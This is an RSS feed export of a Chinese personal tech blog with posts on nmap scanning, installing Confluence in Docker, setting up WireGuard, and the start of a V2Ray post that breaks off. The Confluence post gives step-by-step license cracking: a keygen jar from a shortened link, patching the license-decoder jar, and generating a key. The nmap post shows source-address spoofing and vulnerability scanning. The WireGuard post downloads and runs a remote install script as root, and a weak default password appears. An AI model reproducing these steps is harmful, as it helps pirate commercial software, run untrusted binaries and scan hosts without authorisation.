<?xml version="1.0" encoding="UTF-8"?>  
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">  
    <channel>  
        <title></title>  
        <description>王俊博客，软件改变世界！王俊博客是作者个人知识库、是记录历程回顾的笔记本、是经验教训的资源池， 旨在促进软件开发领域知识与创新的传播，为软件开发中提供帮助。更多是作者本人的经验积累。
</description>  
        <link>http://localhost:4000</link>  
        <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />  
          
            <item>  
               <title>Nmap 常规使用方法</title>  
               <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#介绍&quot; id=&quot;markdown-toc-介绍&quot;&gt;介绍&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#使用&quot; id=&quot;markdown-toc-使用&quot;&gt;使用&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;介绍&quot;&gt;介绍&lt;/h2&gt;

&lt;p&gt;&lt;a href=&quot;//nmap.org/&quot;&gt;nmap&lt;/a&gt; 是一款用于网络扫描的安全审计工具，提供终端和GUI两种方式的工具，使用参数复杂，本文只整理常用的扫描方法。&lt;/p&gt;

&lt;h2 id=&quot;使用&quot;&gt;使用&lt;/h2&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# ping扫描存活的主机，不做探测（端口或操作系统）&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sP&lt;/span&gt; 192.168.199.0/24

&lt;span class=&quot;c&quot;&gt;# 半开放扫描，-sS选项不需要3次握手，使用频率最高的扫描选项：SYN扫描。&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# 又称为半开放扫描，它不打开一个完全的TCP连接，执行得很快，效率高&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; 192.168.199.0/24

&lt;span class=&quot;c&quot;&gt;# 伪装源地址进行扫描，使用-S伪装自己源地址进行扫描的话，必须另外使用-e指定网卡和-Pn参数才能伪装&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; eth0 10.0.1.161 &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; 10.0.1.167 &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# 综合扫描&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-O&lt;/span&gt; 192.168.1.128
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; 192.168.1.128

&lt;span class=&quot;c&quot;&gt;# 扫描目标主机基本漏洞&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-script&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;vuln 192.168.1.128
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
</description>  
               <pubDate>Wed, 27 Nov 2019 00:00:00 +0800</pubDate>  
               <link>http://localhost:4000/2019/11/nmap-general/</link>  
               <guid isPermaLink="true">http://localhost:4000/2019/11/nmap-general/</guid>  
               </item>  
          
            <item>  
               <title>私有知识库 confluence 以 docker 为容器的安装</title>  
               <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#1-背景介绍&quot; id=&quot;markdown-toc-1-背景介绍&quot;&gt;1. 背景介绍&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#2-安装步骤&quot; id=&quot;markdown-toc-2-安装步骤&quot;&gt;2. 安装步骤&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#21-postgresql镜像拉取与启动&quot; id=&quot;markdown-toc-21-postgresql镜像拉取与启动&quot;&gt;2.1 Postgresql镜像拉取与启动&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#22-为confluence准备数据库&quot; id=&quot;markdown-toc-22-为confluence准备数据库&quot;&gt;2.2 为confluence准备数据库&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#23-confluence镜像拉取与启动&quot; id=&quot;markdown-toc-23-confluence镜像拉取与启动&quot;&gt;2.3 Confluence镜像拉取与启动&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#3-界面配置&quot; id=&quot;markdown-toc-3-界面配置&quot;&gt;3. 界面配置&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#4-破解步骤&quot; id=&quot;markdown-toc-4-破解步骤&quot;&gt;4. 破解步骤&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#41-获取破解文件&quot; id=&quot;markdown-toc-41-获取破解文件&quot;&gt;4.1 获取破解文件&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#42-运行破解程序&quot; id=&quot;markdown-toc-42-运行破解程序&quot;&gt;4.2 运行破解程序&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#43-上传破解补丁&quot; id=&quot;markdown-toc-43-上传破解补丁&quot;&gt;4.3 上传破解补丁&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#44-重启confluence容器&quot; id=&quot;markdown-toc-44-重启confluence容器&quot;&gt;4.4 重启confluence容器&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#5-继续配置&quot; id=&quot;markdown-toc-5-继续配置&quot;&gt;5. 继续配置&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#附录安装遇到的问题&quot; id=&quot;markdown-toc-附录安装遇到的问题&quot;&gt;附录：安装遇到的问题&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;1-背景介绍&quot;&gt;1. 背景介绍&lt;/h2&gt;

&lt;p&gt;没有特殊原因，只想什么都用自己的，数据保存在自己这，做好维护，永不丢失，&lt;strong&gt;代代传承&lt;/strong&gt;。几乎用遍所有笔记、wiki、博客，
始终在不断迁移，不停在寻找一个真正合适自己的记录的地方，最终还是决定使用 &lt;a href=&quot;//www.atlassian.com/software/confluence&quot;&gt;confluence&lt;/a&gt;，尽管相对于个人过于庞大、复杂，
但经过研究后发现可以满足所有需求，本文将介绍如何使用 docker 安装部署一套属于自己的知识库管理系统。&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;这里需要说明一下，为什么使用docker方式，简单、高效、隔离性好，已具备基本环境，所以选择&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;2-安装步骤&quot;&gt;2. 安装步骤&lt;/h2&gt;

&lt;p&gt;提前安装好 docker 环境，不同系统安装步骤网上搜索，以下步骤是已经安装好的情况下进行&lt;/p&gt;

&lt;h3 id=&quot;21-postgresql镜像拉取与启动&quot;&gt;2.1 Postgresql镜像拉取与启动&lt;/h3&gt;

&lt;p&gt;这里使用的是 postgresql 数据库做为数据存储，也可以使用其他，如mariadb等等，麻烦的是需要自行下载驱动文件并上传到confluence目录中，所以这里使用 postgresql&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# 拉取&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;docker pull postgres:latest

&lt;span class=&quot;c&quot;&gt;# 运行&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;docker run &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;--name&lt;/span&gt; postgresdb &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 5432:5432 &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;POSTGRES_PASSWORD&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;123456 &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
  postgres
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;22-为confluence准备数据库&quot;&gt;2.2 为confluence准备数据库&lt;/h3&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# 进入 postgresql 容器&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;docker &lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-it&lt;/span&gt; postgresdb /bin/bash
&lt;span class=&quot;c&quot;&gt;# 登录 postgresql 数据库系统&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;psql &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; postgres
&lt;span class=&quot;c&quot;&gt;# 创建一个空的 confluence 数据库&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;CREATE DATABASE confluence WITH OWNER postgres&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# 退出数据库&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\q&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# 退出容器&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;23-confluence镜像拉取与启动&quot;&gt;2.3 Confluence镜像拉取与启动&lt;/h3&gt;

&lt;p&gt;docker 仓库中有很多 confluence 的镜像，不同镜像之间可能因为版本不同，建议使用如下的镜像以保证后续步骤的正常&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# 拉取&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;docker pull cptactionhank/atlassian-confluence:latest

&lt;span class=&quot;c&quot;&gt;# 运行&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;docker run &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;--name&lt;/span&gt; confluence &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 58093:8090 &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;--link&lt;/span&gt; postgresdb:db &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;--user&lt;/span&gt; root:root &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
  cptactionhank/atlassian-confluence:latest
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;confluence配置了&lt;strong&gt;58093&lt;/strong&gt;做为外部映射端口，并连接上面已经启动好的postgresql容器，别名用db，且以root的方式运行&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;3-界面配置&quot;&gt;3. 界面配置&lt;/h2&gt;

&lt;p&gt;上述操作完成后，通过浏览器打开 http://192.168.1.100:58093，注意这里的 192.168.1.100 是 docker 容器地址，如果是本地则使用 127.0.0.1，
端口58093是启动 confluence 容器时指定的对外接口，打开后在语言栏切换成中文后，点击下一步&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;//via.placeholder.com/594x485?text=&amp;quot;&amp;quot;&quot; alt=&quot;confluence-1&quot; data-src=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20191120/confluence-1.webp&quot; /&gt;&lt;/p&gt;

&lt;p&gt;这两个应用对于个人来说用不上，占硬盘和内存，不选择直接点击下一步&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;//via.placeholder.com/594x485?text=&amp;quot;&amp;quot;&quot; alt=&quot;confluence-2&quot; data-src=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20191120/confluence-2.webp&quot; /&gt;&lt;/p&gt;

&lt;p&gt;复制&lt;strong&gt;服务器ID&lt;/strong&gt;到记事本上，后续需要使用，不需要点击下一步，&lt;strong&gt;直接关闭浏览器开始破解操作&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;//via.placeholder.com/594x485?text=&amp;quot;&amp;quot;&quot; alt=&quot;confluence-3&quot; data-src=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20191120/confluence-3.webp&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;4-破解步骤&quot;&gt;4. 破解步骤&lt;/h2&gt;

&lt;h3 id=&quot;41-获取破解文件&quot;&gt;4.1 获取破解文件&lt;/h3&gt;

&lt;p&gt;从 confluence 容器中将 &lt;em&gt;atlassian-extras-decoder-v2-3.4.1.jar&lt;/em&gt; 文件拷贝出来并改名为 &lt;em&gt;atlassian-extras-2.4.jar&lt;/em&gt;&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# 从容器拷贝出来&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;docker &lt;span class=&quot;nb&quot;&gt;cp &lt;/span&gt;confluence:/opt/atlassian/confluence/confluence/WEB-INF/lib/atlassian-extras-decoder-v2-3.4.1.jar ./
&lt;span class=&quot;c&quot;&gt;# 重命名&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mv &lt;/span&gt;atlassian-extras-decoder-v2-3.4.1.jar atlassian-extras-2.4.jar
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;42-运行破解程序&quot;&gt;4.2 运行破解程序&lt;/h3&gt;

&lt;p&gt;先下载破解文件，&lt;a href=&quot;//cigorsica.com/1oBj&quot; target=&quot;_blank&quot;&gt;点击下载&lt;/a&gt;，使用命令&lt;code class=&quot;highlighter-rouge&quot;&gt;java -jar confluence_keygen.jar&lt;/code&gt;运行，这里需要java运行环境，
输入刚才记录的&lt;strong&gt;服务器ID&lt;/strong&gt;，点击&lt;strong&gt;.patch!&lt;/strong&gt;按钮，选择之前改名的 &lt;em&gt;atlassian-extras-2.4.jar&lt;/em&gt; 文件，提示”Jar successfully patched”表示
补丁打成功。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;//via.placeholder.com/594x485?text=&amp;quot;&amp;quot;&quot; alt=&quot;confluence-4&quot; data-src=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20191120/confluence-4.webp&quot; /&gt;&lt;/p&gt;

&lt;p&gt;再点击&lt;strong&gt;.gen!&lt;/strong&gt;按钮生成密钥信息并拷贝记录起来，后面要使用&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;//via.placeholder.com/594x485?text=&amp;quot;&amp;quot;&quot; alt=&quot;confluence-5&quot; data-src=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20191120/confluence-5.webp&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;43-上传破解补丁&quot;&gt;4.3 上传破解补丁&lt;/h3&gt;

&lt;p&gt;将打好破解补丁的文件 &lt;em&gt;atlassian-extras-2.4.jar&lt;/em&gt; 重新改名为 &lt;em&gt;atlassian-extras-decoder-v2-3.4.1.jar&lt;/em&gt; 并上传覆盖到 confluence 容器原有的位置中&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# 重新命名&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mv &lt;/span&gt;atlassian-extras-2.4.jar atlassian-extras-decoder-v2-3.4.1.jar
&lt;span class=&quot;c&quot;&gt;# 上传覆盖&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;docker &lt;span class=&quot;nb&quot;&gt;cp &lt;/span&gt;atlassian-extras-decoder-v2-3.4.1.jar confluence:/opt/atlassian/confluence/confluence/WEB-INF/lib/
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;44-重启confluence容器&quot;&gt;4.4 重启confluence容器&lt;/h3&gt;

&lt;p&gt;重新启动 confluence 容器，以让 confluence 重新加载已经破解的补丁文件，否则内存中使用的还是未破解的&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# 重启容器&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;docker restart confluence
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;5-继续配置&quot;&gt;5. 继续配置&lt;/h2&gt;

&lt;p&gt;confluence 容器重启好后重新打开界面控制台将会直接跳到输入密钥内容的界面，粘贴上面拷贝的密钥内容后点击下一步开始设置数据库&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;//via.placeholder.com/594x485?text=&amp;quot;&amp;quot;&quot; alt=&quot;confluence-6&quot; data-src=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20191120/confluence-6.webp&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;//via.placeholder.com/594x485?text=&amp;quot;&amp;quot;&quot; alt=&quot;confluence-7&quot; data-src=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20191120/confluence-7.webp&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;//via.placeholder.com/594x485?text=&amp;quot;&amp;quot;&quot; alt=&quot;confluence-8&quot; data-src=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20191120/confluence-8.webp&quot; /&gt;&lt;/p&gt;

&lt;p&gt;设置使用通过连接字符串连接数据库，内容填写”jdbc:postgresql://db:5432/confluence”，输入用户名密码，点击测试连接，成功后点击下一步，开始
刷入 confluence 表结构，稍等一会就会出现以下界面表示安装成功&lt;/p&gt;

&lt;p&gt;首次使用的话推荐选择”示范站点”，包含了许多demo的文章供编写参考，有洁癖的话使用”空白站点”，这样更纯净些&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;//via.placeholder.com/594x485?text=&amp;quot;&amp;quot;&quot; alt=&quot;confluence-9&quot; data-src=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20191120/confluence-9.webp&quot; /&gt;&lt;/p&gt;

&lt;p&gt;配置Confluence中的管理用户和组，就是管理员用户名和密码等信息，完成后显示设置成功&lt;/p&gt;

&lt;h2 id=&quot;附录安装遇到的问题&quot;&gt;附录：安装遇到的问题&lt;/h2&gt;

&lt;p&gt;在设置数据库连接后点击下一步时可能会超时，超时后重新刷新界面出现”Spring Application context has not been set”的错误，
不要怀疑，直接到 confluence 容器中删除文件 confluence.cfg.xml 后，重新启动，将会再次进入第一步的配置界面，密钥可以使用
之前保存的，继续步骤就可以成功&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# 删除 confluence.cfg.xml 文件&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;docker &lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;confluence &lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-rf&lt;/span&gt; /var/atlassian/confluence/confluence.cfg.xml
&lt;span class=&quot;c&quot;&gt;# 重启 confluence 容器&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;docker restart confluence
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
</description>  
               <pubDate>Wed, 20 Nov 2019 00:00:00 +0800</pubDate>  
               <link>http://localhost:4000/2019/11/confluence-build/</link>  
               <guid isPermaLink="true">http://localhost:4000/2019/11/confluence-build/</guid>  
               </item>  
          
            <item>  
               <title>旅行必备 Wireguard 的搭建与使用</title>  
               <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#1-介绍&quot; id=&quot;markdown-toc-1-介绍&quot;&gt;1. 介绍&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#2-安装和使用&quot; id=&quot;markdown-toc-2-安装和使用&quot;&gt;2. 安装和使用&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#21-创建实例&quot; id=&quot;markdown-toc-21-创建实例&quot;&gt;2.1 创建实例&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#22-执行安装&quot; id=&quot;markdown-toc-22-执行安装&quot;&gt;2.2 执行安装&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#23-防火墙规则&quot; id=&quot;markdown-toc-23-防火墙规则&quot;&gt;2.3 防火墙规则&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#24-客户端使用&quot; id=&quot;markdown-toc-24-客户端使用&quot;&gt;2.4 客户端使用&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;//via.placeholder.com/594x311?text=&amp;quot;&amp;quot;&quot; alt=&quot;wireguard&quot; data-src=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20190610/og-logo.png&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;1-介绍&quot;&gt;1. 介绍&lt;/h2&gt;

&lt;p&gt;&lt;a href=&quot;https://www.wireguard.com/&quot;&gt;WireGuard&lt;/a&gt; 是 Jason A. Donenfeld 开发的开源VPN协议。目前已经支持Linux, macOS, Android, iOS以及OpenWrt平台。WireGuard使用UDP协议传输数据，在不使用的情况下默认不会传输任何 UDP 数据包，所以比常规VPN省电很多，可以像SS一样一直挂着使用。WireGuard协议的速度瞬秒其它VPN协议。&lt;/p&gt;

&lt;h2 id=&quot;2-安装和使用&quot;&gt;2. 安装和使用&lt;/h2&gt;

&lt;h3 id=&quot;21-创建实例&quot;&gt;2.1 创建实例&lt;/h3&gt;

&lt;p&gt;参考 &lt;a href=&quot;//wangjun.dev/2019/06/ssr-build/&quot;&gt;旅行必备 ShadowsocketR 搭建与使用&lt;/a&gt; 中的创建实例&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;唯一区别就是系统选择Centos7&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;22-执行安装&quot;&gt;2.2 执行安装&lt;/h3&gt;

&lt;p&gt;打开 vm 实例的 ssh 终端，输入以下命令执行安装：&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# 切换成root用户&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# 安装wget工具&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;yum &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-y&lt;/span&gt; wget

&lt;span class=&quot;c&quot;&gt;# 下载一键安装脚本&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;wget https://raw.githubusercontent.com/yobabyshark/wireguard/master/wireguard_install.sh

&lt;span class=&quot;c&quot;&gt;# 授权并执行&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x wireguard_install.sh &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; ./wireguard_install.sh
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;先升级系统内核，选择1，等待升级完成后，执行&lt;code class=&quot;highlighter-rouge&quot;&gt;reboot&lt;/code&gt;重启系统&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. 升级系统内核
2. 安装wireguard
3. 升级wireguard
4. 卸载wireguard
5. 显示客户端二维码
6. 增加用户
0. 退出脚
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;系统重启完成后，再次执行一键安装脚本&lt;code class=&quot;highlighter-rouge&quot;&gt;./wireguard_install.sh&lt;/code&gt;，这次选择&lt;strong&gt;安装wireguard&lt;/strong&gt;，等待执行完成后，会显示配置二维码和配置信息，如下：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;//via.placeholder.com/487x713?text=&amp;quot;&amp;quot;&quot; alt=&quot;wireguard-result&quot; data-src=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20190610/wireguard-result.png&quot; /&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;二维码内容就是 /etc/wireguard/client.conf 文件内容&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;23-防火墙规则&quot;&gt;2.3 防火墙规则&lt;/h3&gt;

&lt;p&gt;wireguard安装完后，查看随机分配的端口号，如上面截图中的是38597，确定在防火墙规则中开放了对此端口号的出入站。&lt;/p&gt;

&lt;h3 id=&quot;24-客户端使用&quot;&gt;2.4 客户端使用&lt;/h3&gt;

&lt;p&gt;IOS与Mac客户端可以在appstore里直接下载wireguard，但需要使用美区账号。&lt;/p&gt;

&lt;p&gt;Window端下载 &lt;a href=&quot;https://tunsafe.com/download&quot;&gt;https://tunsafe.com/download&lt;/a&gt;&lt;/p&gt;
</description>  
               <pubDate>Fri, 07 Jun 2019 00:00:00 +0800</pubDate>  
               <link>http://localhost:4000/2019/06/wireguard-build/</link>  
               <guid isPermaLink="true">http://localhost:4000/2019/06/wireguard-build/</guid>  
               </item>  
          
            <item>  
               <title>旅行必备 V2Ray 的高级使用方式</title>  
               <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#1-介绍&quot; id=&quot;markdown-toc-1-介绍&quot;&gt;1. 介绍&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#2-安装和使用&quot; id=&quot;markdown-toc-2-安装和使用&quot;&gt;2. 安装和使用&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#21-创建实例&quot; id=&quot;markdown-toc-21-创建实例&quot;&gt;2.1 创建实例&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#22-执行安装&quot; id=&quot;markdown-toc-22-执行安装&quot;&gt;2.2 执行安装&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#23-配置文件&quot; id=&quot;markdown-toc-23-配置文件&quot;&gt;2.3 配置文件&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#24-重启服务&quot; id=&quot;markdown-toc-24-重启服务&quot;&gt;2.4 重启服务&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#25-配置连接&quot; id=&quot;markdown-toc-25-配置连接&quot;&gt;2.5 配置连接&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#3-欺骗与伪装&quot; id=&quot;markdown-toc-3-欺骗与伪装&quot;&gt;3. 欺骗与伪装&lt;/a&gt;    &lt;ul&gt;
